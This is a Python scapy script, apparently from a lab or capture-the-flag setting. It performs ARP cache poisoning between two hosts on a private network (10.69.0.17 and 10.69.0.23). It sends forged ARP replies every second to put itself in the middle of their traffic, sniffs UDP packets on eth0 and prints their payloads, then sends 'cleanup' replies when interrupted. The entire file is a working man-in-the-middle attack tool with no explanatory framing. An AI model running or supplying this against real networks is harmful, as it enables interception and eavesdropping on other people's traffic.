import logging
import time

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import ARP, send, AsyncSniffer, Packet, UDP


def process_packet(pkt: Packet) -> None:
    if pkt.haslayer(UDP):
        udp_pkt = pkt[UDP]
        src_port = udp_pkt.sport
        dst_port = udp_pkt.dport
        payload = decode_payload(udp_pkt.load)  

        print(f'UDP Packet: Source Port: {src_port}, Destination Port: {dst_port}, Payload: {payload}')



def decode_payload(payload: bytes) -> str:
    try:
        return payload.decode('utf-8', 'ignore')
    except UnicodeDecodeError:
        return 'Binary data'


def main() -> None:
    sniff = AsyncSniffer(iface='eth0', prn=process_packet, store=False)

    try:
        sniff.start()
        print('[>] Starting poisoning')
        while True:
            send(ARP(op='is-at', pdst='10.69.0.17', psrc='10.69.0.23', hwsrc='02:42:ac:11:00:04'), verbose=False)
            send(ARP(op='is-at', pdst='10.69.0.23', psrc='10.69.0.17', hwsrc='02:42:ac:11:00:04'), verbose=False)
            time.sleep(1) 
    except KeyboardInterrupt:
        print('\n[>] Got keyboard interrupt')
        sniff.stop()

    print('[>] Cleaning up')
    send(ARP(op='is-at', pdst='10.69.0.17', psrc='10.69.0.23', hwsrc='02:42:ac:11:00:99'), verbose=False)
    send(ARP(op='is-at', pdst='10.69.0.23', psrc='10.69.0.17', hwsrc='02:42:ac:11:00:99'), verbose=False)

if __name__ == '__main__':
    main()
